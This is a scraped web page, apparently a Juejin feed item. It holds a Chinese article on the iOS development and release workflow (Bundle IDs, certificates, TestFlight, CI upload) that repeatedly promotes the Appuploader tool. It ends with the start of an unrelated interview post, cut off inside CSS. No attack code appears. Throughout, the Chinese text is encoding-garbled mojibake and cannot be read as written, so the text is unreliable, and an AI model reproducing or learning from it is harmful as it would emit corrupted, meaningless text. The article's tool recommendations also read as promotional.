                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>è¿‘å¹´æ¥ï¼Œç§»åŠ¨åº”ç”¨çš„å¼€å‘æ¨¡å¼ä¸æ–­æ¼”åŒ–ï¼ŒiOS å¼€å‘æµç¨‹ä¸å†æ˜¯â€œå†™ä»£ç  â†’ æ‰“åŒ… â†’ ä¸Šæ¶â€çš„çº¿æ€§ç»“æ„ï¼Œè€Œæ˜¯ç”±éœ€æ±‚åˆ†æã€æ¶æ„è®¾è®¡ã€è¯ä¹¦ä½“ç³»ã€æ„å»ºè‡ªåŠ¨åŒ–ã€æµ‹è¯•åˆ†å‘ã€å®¡æŸ¥æäº¤ç­‰å¤šä¸ªç¯èŠ‚ç»„æˆçš„å·¥ç¨‹é—­ç¯ã€‚å›¢é˜Ÿè§„æ¨¡è¶Šå¤§ã€ä½¿ç”¨è·¨ç«¯æŠ€æœ¯è¶Šå¤šã€æ“ä½œç³»ç»Ÿè¶Šåˆ†æ•£ï¼ˆWindows / Linux / macOS æ··åˆä½¿ç”¨ï¼‰ï¼Œæ•´ä¸ªæµç¨‹è¶Šå®¹æ˜“å› ä¸ºç­¾åé“¾è·¯ä¸é€æ˜ã€è¯ä¹¦åä½œä¸ä¸€è‡´æˆ–ä¸Šæ¶è¡Œä¸ºéš¾ç»Ÿä¸€è€Œå‡ºç°æ–­ç‚¹ã€‚</p>
<p>åŸºäºå®é™…é¡¹ç›®ç»éªŒï¼Œæœ¬æ–‡ç»“åˆç°ä»£å›¢é˜Ÿæ™®éé‡‡ç”¨çš„å·¥å…·é“¾ä¸å·¥ç¨‹æ²»ç†æ–¹å¼ï¼Œå¯¹ iOS å¼€å‘æµç¨‹è¿›è¡Œä½“ç³»çº§æ‹†è§£ã€‚</p>
<hr/>
<h2 data-id="heading-0"><strong>ä¸€ã€éœ€æ±‚é˜¶æ®µï¼šç¡®å®šåŠŸèƒ½è¾¹ç•Œä¸èƒ½åŠ›éœ€æ±‚</strong></h2>
<p>iOS å¼€å‘æµç¨‹çš„ç¬¬ä¸€æ­¥å¹¶ä¸æ˜¯å†™ä»£ç ï¼Œè€Œæ˜¯å›ç­”å‡ ä¸ªå…³é”®é—®é¢˜ï¼š</p>
<ul>
<li>åº”ç”¨éœ€è¦å“ªäº›åŸç”Ÿèƒ½åŠ›ï¼Ÿï¼ˆPushã€å®šä½ã€ç›¸æœºã€è‹¹æœç™»å½•ç­‰ï¼‰</li>
<li>æ˜¯å¦éœ€è¦åå°èƒ½åŠ›ï¼Ÿï¼ˆApp Groupsã€APNsã€Universal Links ç­‰ï¼‰</li>
<li>åº”ç”¨æ˜¯å¦å¤šè¯­è¨€ã€å¤šåŒºåŸŸéƒ¨ç½²ï¼Ÿ</li>
<li>æ˜¯å¦éœ€è¦é…å¥—çš„ TestFlight æµç¨‹ï¼Ÿ</li>
<li>Bundle ID æ˜¯å¦éœ€è¦è§„åˆ’å¤šä¸ªç¯å¢ƒç‰ˆæœ¬ï¼Ÿ</li>
</ul>
<p>è¿™äº›èƒ½åŠ›éƒ½ä¸ç­¾åä½“ç³»ç›¸å…³ï¼Œå› æ­¤å‰æœŸæ¶æ„è®¾è®¡è¦æ˜ç¡®åº”ç”¨èŒƒå›´ï¼Œå¦åˆ™åæœŸä¿®æ”¹ä¼šç‰µåŠ¨è¯ä¹¦ã€æè¿°æ–‡ä»¶ä¸é…ç½®é¡¹ï¼Œå¯¼è‡´è¿”å·¥ã€‚</p>
<hr/>
<h2 data-id="heading-1"><strong>äºŒã€å·¥ç¨‹åˆå§‹åŒ–ï¼šé…ç½® Bundle ID ä¸è¯ä¹¦ä½“ç³»</strong></h2>
<p>iOS å·¥ç¨‹æœ¬è´¨æ˜¯ä¸€å¥—é«˜åº¦ä¾èµ–â€œèº«ä»½â€çš„é¡¹ç›®ç»“æ„ï¼Œå› æ­¤åˆå§‹åŒ–é˜¶æ®µè¦ç‰¹åˆ«å…³æ³¨è¯ä¹¦ã€æè¿°æ–‡ä»¶ä¸ Bundle ID çš„ä¸€è‡´æ€§ã€‚</p>
<h3 data-id="heading-2"><strong>1. Bundle ID åˆ›å»ºä¸ç®¡ç†</strong></h3>
<p>Bundle ID æ˜¯æ•´ä¸ªç­¾åé“¾è·¯çš„å…¥å£ã€‚
ä¸ºäº†é¿å…å¤šäººé‡å¤åˆ›å»ºã€å‘½åæ··ä¹±æˆ–é—ç•™å·¥ç¨‹å¯¼è‡´çš„å†²çªï¼Œæˆ‘é€šå¸¸ä¼šé€šè¿‡å·¥å…·ç¡®è®¤è´¦å·å†…å·²æœ‰çš„ Bundle IDï¼Œä¾‹å¦‚ï¼š</p>
<ul>
<li>ä½¿ç”¨ <strong>Appuploader çš„ Bundle ID æŸ¥çœ‹åŠŸèƒ½</strong> æ£€æŸ¥å½“å‰è´¦å·ä¸‹å·²æœ‰çš„æ ‡è¯†ç¬¦</li>
<li>ç¡®è®¤æ˜¯å¦å­˜åœ¨é‡å¤å‘½åæˆ–ç›¸ä¼¼ç»“æ„å¯¼è‡´çš„å†²çª</li>
<li>åœ¨å›¢é˜Ÿä¸­è®°å½• Bundle ID çš„ç”¨é€”ä¸èƒ½åŠ›é…ç½®</li>
</ul>
<p>æ¸…æ™°çš„ Bundle ID ä½“ç³»èƒ½è®©å›¢é˜Ÿé¿å…â€œæ„å»ºæˆåŠŸä½†æ— æ³•ä¸Šæ¶â€çš„é—®é¢˜ã€‚
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/96e4e0f2d49841308787112612048d00~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55av54uC55qE56iL5bqP54y0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041808&amp;x-signature=3Yigs%2Fl6Du03JcaRF29%2By1hDBug%3D" alt="bid" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-3"><strong>2. è¯ä¹¦ä¸æè¿°æ–‡ä»¶çš„ç”Ÿæˆä¸åä½œ</strong></h3>
<p>è¯ä¹¦æ˜¯å›¢é˜Ÿåä½œä¸­æœ€å®¹æ˜“æ··ä¹±çš„éƒ¨åˆ†ã€‚å½“æˆå‘˜ä½¿ç”¨ä¸åŒç”µè„‘ã€ä¸åŒæ“ä½œç³»ç»Ÿæ—¶ï¼Œè¯ä¹¦å…±äº«ä¸è§£æå°¤ä¸ºå…³é”®ã€‚</p>
<p>åœ¨è·¨ç«¯é¡¹ç›®æˆ–åå°å›¢é˜Ÿå‚ä¸æ‰“åŒ…çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä¼šä½¿ç”¨ï¼š</p>
<ul>
<li><strong>Appuploader çš„è¯ä¹¦ç”Ÿæˆèƒ½åŠ›</strong>ï¼šå¯åœ¨ Windows / Linux / macOS åˆ›å»ºå¼€å‘/å‘å¸ƒè¯ä¹¦ï¼Œé¿å…å›¢é˜Ÿä¾èµ–å•ä¸€ Macã€‚</li>
<li><strong>mobileprovision æ–‡ä»¶æŸ¥çœ‹ä¸è§£æ</strong>ï¼šç”¨äºæ£€æŸ¥ç»‘å®šè¯ä¹¦ã€Bundle IDã€Team IDã€Capabilities ç­‰ä¿¡æ¯ã€‚</li>
</ul>
<p>æå‰è§£æè¿™äº›æ–‡ä»¶å¯ä»¥å‡å°‘ç­¾åé“¾è·¯é”™è¯¯ï¼Œå°¤å…¶åœ¨å¤šäººåä½œæˆ– CI æ„å»ºåœºæ™¯ä¸­éå¸¸é‡è¦ã€‚
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/583452dc01ba41f7ad6cf54824084021~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55av54uC55qE56iL5bqP54y0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041808&amp;x-signature=mAgwpwaSfUsmPwl%2FyQGJkGhvvg0%3D" alt="è¯ä¹¦ç”Ÿæˆ" loading="lazy"/>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7618435448e5475a9ac906fb7be43a48~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55av54uC55qE56iL5bqP54y0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041808&amp;x-signature=33r3peUUhX3YJopCjHxgRWT3V%2B0%3D" alt="æ–‡ä»¶æŸ¥çœ‹" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-4"><strong>ä¸‰ã€å¼€å‘é˜¶æ®µï¼šå·¥ç¨‹ç»“æ„ã€æ¨¡å—åˆ’åˆ†ä¸è·¨ç«¯å…¼å®¹</strong></h2>
<p>æ— è®ºä½¿ç”¨ Swiftã€Objective-Cï¼Œè¿˜æ˜¯ uni-appã€Flutterã€React Nativeï¼Œå¼€å‘é˜¶æ®µéœ€å…³æ³¨ä»¥ä¸‹å·¥ç¨‹é—®é¢˜ï¼š</p>
<h3 data-id="heading-5"><strong>1. ç›®å½•ç»“æ„ä¸æ¨¡å—è¾¹ç•Œæ¸…æ™°</strong></h3>
<p>å·¥ç¨‹ç»“æ„å°†å½±å“åç»­è°ƒè¯•ä¸æ„å»ºè‡ªåŠ¨åŒ–ï¼Œä¾‹å¦‚ï¼š</p>
<ul>
<li>ç‹¬ç«‹çš„èµ„æºæ¨¡å—</li>
<li>æ¸…æ™°çš„ä¸šåŠ¡æ¨¡å—åˆ’åˆ†</li>
<li>ç‹¬ç«‹çš„é…ç½®æ–‡ä»¶ï¼ˆInfo.plistã€æ„å»ºè„šæœ¬ç­‰ï¼‰</li>
</ul>
<p>è‰¯å¥½çš„ç»“æ„èƒ½å‡å°‘ TF å¤„ç†å’Œä¸Šæ¶è¿‡ç¨‹ä¸­çš„æ½œåœ¨é—®é¢˜ã€‚</p>
<h3 data-id="heading-6"><strong>2. ç¯å¢ƒåˆ‡æ¢æœºåˆ¶</strong></h3>
<p>è®¸å¤šå›¢é˜Ÿåœ¨æ„å»ºå¤šä¸ªç¯å¢ƒæ—¶ï¼Œåªä¿®æ”¹æŸä¸€å¤„é…ç½®ï¼ˆå¦‚ API åœ°å€ï¼‰ï¼Œä½†å¿˜è®°ä¿®æ”¹ï¼š</p>
<ul>
<li>Info.plist å­—æ®µ</li>
<li>Bundle ID</li>
<li>æè¿°æ–‡ä»¶ç»‘å®š</li>
</ul>
<p>å¯¼è‡´ä¸åŒç¯å¢ƒæ„å»ºæ··æ‚ï¼Œç”šè‡³å¼•å‘è‹¹æœå®¡æ ¸çš„é˜»æ–­æ€§æ‹’ç»ã€‚</p>
<hr/>
<h2 data-id="heading-7"><strong>å››ã€æµ‹è¯•é˜¶æ®µï¼šä»æœ¬åœ°è°ƒè¯•åˆ° TF åˆ†å‘</strong></h2>
<p>æµ‹è¯•é˜¶æ®µä¸ä»…æ˜¯åŠŸèƒ½éªŒè¯ï¼ŒåŒæ—¶ä¹Ÿæ˜¯â€œç­¾åé“¾è·¯éªŒè¯â€ã€‚</p>
<h3 data-id="heading-8"><strong>1. æœ¬åœ°çœŸæœºæµ‹è¯•</strong></h3>
<p>åœ¨æŸäº›é¡¹ç›®ä¸­ï¼Œæˆ‘ä¼šé€šè¿‡ Appuploader çš„åŠŸèƒ½æ‰§è¡Œï¼š</p>
<ul>
<li>USB å®‰è£… IPA</li>
<li>è¯»å–æµ‹è¯•è®¾å¤‡ UDIDï¼ˆä¾¿äºæ›´æ–°å¼€å‘æè¿°æ–‡ä»¶ï¼‰</li>
</ul>
<p>è¿™ç§æ–¹å¼æ¯” TestFlight æ›´å¿«é€‚åˆåœ¨å¼€å‘é˜¶æ®µæŒç»­éªŒè¯ã€‚</p>
<hr/>
<h3 data-id="heading-9"><strong>2. TestFlight æµ‹è¯•ï¼ˆä¸­åæœŸéªŒè¯ï¼‰</strong></h3>
<p>TF æ˜¯æ­£å¼å‘å¸ƒå‰çš„é‡è¦é˜¶æ®µï¼Œå®ƒèƒ½æš´éœ²ï¼š</p>
<ul>
<li>ç­¾åé—®é¢˜</li>
<li>æƒé™é…ç½®é—®é¢˜</li>
<li>æ„å»ºå…¼å®¹æ€§é—®é¢˜</li>
</ul>
<p>åœ¨ä¸Šä¼  TF å‰ï¼Œæˆ‘ä¸€èˆ¬ä¼šæ£€æŸ¥ IPA å†…çš„ä¿¡æ¯ï¼Œç¡®ä¿ï¼š</p>
<ul>
<li>Info.plist å­—æ®µå®Œæ•´</li>
<li>mobileprovision ä½¿ç”¨æ­£ç¡®çš„å‘å¸ƒè¯ä¹¦</li>
<li>Bundle ID ä¸ App Store Connect é…ç½®ä¸€è‡´</li>
</ul>
<p>è¿™äº›æ£€æŸ¥å¯é€šè¿‡ Appuploader çš„ IPA å†…å®¹æŸ¥çœ‹åŠŸèƒ½åœ¨ä»»æ„ç³»ç»Ÿæ‰§è¡Œã€‚</p>
<hr/>
<h2 data-id="heading-10"><strong>äº”ã€æ„å»ºä¸è‡ªåŠ¨åŒ–ï¼šæµæ°´çº¿å¦‚ä½•ä¸ç­¾åä½“ç³»åä½œ</strong></h2>
<p>ç°ä»£å›¢é˜Ÿé€šå¸¸é‡‡ç”¨ CI/CDï¼ˆGitLab CIã€GitHub Actionsã€Jenkins ç­‰ï¼‰è¿›è¡Œæ„å»ºã€‚</p>
<p>å¸¸è§æµç¨‹ï¼š</p>
<ol>
<li>CI æ‰§è¡Œå·¥ç¨‹æ„å»ºï¼ˆé€šå¸¸éœ€è¦ macOS Runnerï¼‰</li>
<li>æ„å»ºäº§ç‰©ï¼ˆIPAï¼‰ä¸Šä¼ è‡³æ–‡ä»¶å­˜å‚¨</li>
<li>è§¦å‘ä¸Šä¼ æµç¨‹ï¼ˆå¯ç‹¬ç«‹æ‰§è¡Œï¼‰</li>
</ol>
<p>åœ¨è‡ªåŠ¨åŒ–ä¸Šä¼ ç¯èŠ‚ï¼Œæˆ‘é€šå¸¸ä¼šé€‰æ‹©è·¨å¹³å°æ–¹å¼ï¼Œä¾‹å¦‚ï¼š</p>
<h3 data-id="heading-11"><strong>ä½¿ç”¨ Appuploader CLI ä¸Šä¼  IPA</strong></h3>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-css" lang="css">appuploader_cli -u dev<span class="hljs-keyword">@icloud</span>.com -p xxx-xxx -c <span class="hljs-number">1</span> -f output.ipa
</code></pre>
<p>ç†ç”±åŒ…æ‹¬ï¼š</p>
<ul>
<li>å¯åœ¨ <strong>Windows / Linux / macOS</strong> è¿è¡Œ</li>
<li>ä¸ä¾èµ– Transporter æˆ– Xcode</li>
<li>æ˜“é›†æˆåˆ°è‡ªåŠ¨åŒ–è„šæœ¬</li>
<li>ä¸Šä¼ åŠ¨ä½œä¸æºå¸¦ Mac è®¾å¤‡ä¿¡æ¯</li>
</ul>
<p>è¿™è®©å›¢é˜Ÿèƒ½å¤Ÿå°†ä¸Šä¼ ä¸æ„å»ºæ‹†åˆ†ï¼Œä¸å†è¢«ä¸Šä¼ èŠ‚ç‚¹é™åˆ¶ç”Ÿäº§æ•ˆç‡ã€‚</p>
<hr/>
<h2 data-id="heading-12"><strong>å…­ã€ä¸Šæ¶å‰å‡†å¤‡ï¼šæ£€æŸ¥ç‚¹æ¯”ä¸Šä¼ æœ¬èº«æ›´é‡è¦</strong></h2>
<p>åœ¨æäº¤å®¡æ ¸å‰ï¼Œå·¥ç¨‹ä¾§éœ€è¦ç¡®è®¤ä»¥ä¸‹å†…å®¹ï¼š</p>
<ul>
<li>Bundle IDã€æè¿°æ–‡ä»¶ã€è¯ä¹¦ä¸€è‡´</li>
<li>IPA ç»“æ„æ— è¯¯</li>
<li>æƒé™å£°æ˜æ¸…æ™°ï¼ˆå®šä½ã€ç›¸æœºã€è“ç‰™ç­‰ï¼‰</li>
<li>éšç§æ”¿ç­–ä¸æƒé™è¯´æ˜å†™å…¥ Info.plist</li>
<li>æ‰€æœ‰è°ƒè¯•ä»£ç å·²å…³é—­</li>
<li>ä¸Šæ¶æˆªå›¾ã€å…³é”®è¯ã€å¤šè¯­è¨€ä¿¡æ¯å‡†å¤‡å®Œæ•´</li>
</ul>
<p>åœ¨è¿™äº›èŠ‚ç‚¹ä¸­ï¼Œâ€œIPA å†…éƒ¨é…ç½®æ£€æŸ¥â€å°¤ä¸ºå…³é”®ï¼Œå› ä¸ºé—®é¢˜é€šå¸¸éšè—åœ¨å†…éƒ¨ç»“æ„ä¸­ã€‚</p>
<p>ä½¿ç”¨ Appuploader æŸ¥çœ‹ IPA å†…å®¹å¯ä»¥æå‰å‘ç°é…ç½®é”™è¯¯ï¼Œé¿å…æäº¤å¤±è´¥åå†è¿”å·¥ã€‚</p>
<hr/>
<h2 data-id="heading-13"><strong>å‘å¸ƒé˜¶æ®µï¼šä¸Šä¼ ã€å¤„ç†ã€å®¡æ ¸</strong></h2>
<p>ä¸Šä¼ é˜¶æ®µæ˜¯æœ€æ•æ„Ÿä¹Ÿæœ€å®¹æ˜“å—åˆ¶äºå·¥å…·é“¾çš„éƒ¨åˆ†ã€‚
è·¨å¹³å°å›¢é˜Ÿå¸¸è§é—®é¢˜åŒ…æ‹¬ï¼š</p>
<ul>
<li>æ²¡æœ‰ Mac æ— æ³•ä¸Šä¼ </li>
<li>CI æ— æ³•è°ƒç”¨ Transporter</li>
<li>ä¸Šä¼ å‡­æ®åˆ†æ•£åœ¨ä¸åŒæˆå‘˜è®¾å¤‡ä¸­</li>
</ul>
<p>é€šè¿‡ Appuploader CLI æˆ– API æ¥æ‰§è¡Œä¸Šä¼ å¯ä»¥è®©æ­¤ç¯èŠ‚æ›´åŠ å¯æ§ï¼Œå¹¶ä¸”æ‰§è¡Œé€»è¾‘å¯ä»¥è¢«è„šæœ¬åŒ–ä¸è‡ªåŠ¨åŒ–ã€‚</p>
<p>ä¸Šä¼ åï¼Œåº”ç”¨è¿›å…¥ï¼š</p>
<ul>
<li><strong>Processingï¼ˆæ„å»ºå¤„ç†ï¼‰</strong></li>
<li><strong>å®¡æ ¸é˜¶æ®µ</strong></li>
</ul>
<p>è¿™éƒ¨åˆ†ä¸åœ¨å¼€å‘æ§åˆ¶èŒƒå›´å†…ï¼Œä½†è‰¯å¥½çš„å·¥ç¨‹æµç¨‹èƒ½å‡å°‘è¢«æ‹’é£é™©ã€‚</p>
<hr/>
<h2 data-id="heading-14"><strong>ç°ä»£ iOS å¼€å‘ç”Ÿå‘½é“¾å·²ç»è½¬å‘â€œå·¥å…·åä½œâ€æ¨¡å¼</strong></h2>
<p>è¿‡å» iOS å¼€å‘ä¸»è¦ä¾èµ–å•å° Mac ä¸ Xcodeï¼Œæœ¬åœ°å¤„ç†æ‰€æœ‰ç¯èŠ‚ã€‚
å¦‚ä»Šçš„å·¥ç¨‹ä½“ç³»æ›´åŠ åˆ†å¸ƒå¼ã€å¤šç«¯åŒ–ã€è‡ªåŠ¨åŒ–ï¼Œä¹Ÿæ›´ä¾èµ–å·¥å…·é“¾åä½œã€‚</p>
<p>åœ¨ç°ä»£ iOS æµç¨‹ä¸­ï¼Œæœ€å…³é”®çš„æ˜¯ï¼š</p>
<ul>
<li>æ˜ç¡® Bundle ID ä¸è¯ä¹¦ä½“ç³»</li>
<li>æ„å»ºè¿‡ç¨‹è‡ªåŠ¨åŒ–</li>
<li>IPA å†…å®¹å¯æ£€æŸ¥ã€å¯è¿½è¸ª</li>
<li>ä¸Šä¼ æµç¨‹å¯è·¨å¹³å°æ‰§è¡Œ</li>
<li>æµ‹è¯•æµç¨‹å¿«é€Ÿå¯é‡å¤</li>
<li>æäº¤å®¡æ ¸æ—¶ç»“æ„æ¸…æ™°æ— è¯¯</li>
</ul>
<p>æœ€ç»ˆç›®æ ‡ä¸æ˜¯æ›¿æ¢æŸä¸ªå·¥å…·ï¼Œè€Œæ˜¯æ„å»ºä¸€ä¸ªèƒ½è®©ä»»ä½•æˆå‘˜ç†è§£ã€èƒ½è¢«è‡ªåŠ¨åŒ–æ‰§è¡Œã€èƒ½è·¨å¹³å°å·¥ä½œçš„ iOS å¼€å‘ä¸å‘å¸ƒæµç¨‹ã€‚
å‚è€ƒé“¾æ¥ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.appuploader.net%2Ftutorial%2Fzh%2F1%2F1.html" target="_blank" title="https://www.appuploader.net/tutorial/zh/1/1.html" ref="nofollow noopener noreferrer">www.appuploader.net/tutorial/zhâ€¦</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[äº¬ä¸œå‰ç«¯å¼€å‘å®ä¹ ç”Ÿ ä¸€é¢]]></title>    <link>https://juejin.cn/post/7582232291620536358</link>    <guid>https://juejin.cn/post/7582232291620536358</guid>    <pubDate>2025-12-11T07:24:30.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582232291620536358" data-draft-id="7581297888808435762" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="äº¬ä¸œå‰ç«¯å¼€å‘å®ä¹ ç”Ÿ ä¸€é¢"/> <meta itemprop="keywords" content="å‰ç«¯,é¢è¯•,ç½‘ç»œåè®®"/> <meta itemprop="datePublished" content="2025-12-11T07:24:30.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¤©å¤©æ‰­ç "/> <meta itemprop="url" content="https://juejin.cn/user/3349589831715801"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            äº¬ä¸œå‰ç«¯å¼€å‘å®ä¹ ç”Ÿ ä¸€é¢
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3349589831715801/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¤©å¤©æ‰­ç 
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-11T07:24:30.000Z" title="Thu Dec 11 2025 07:24:30 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-11
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»33åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body 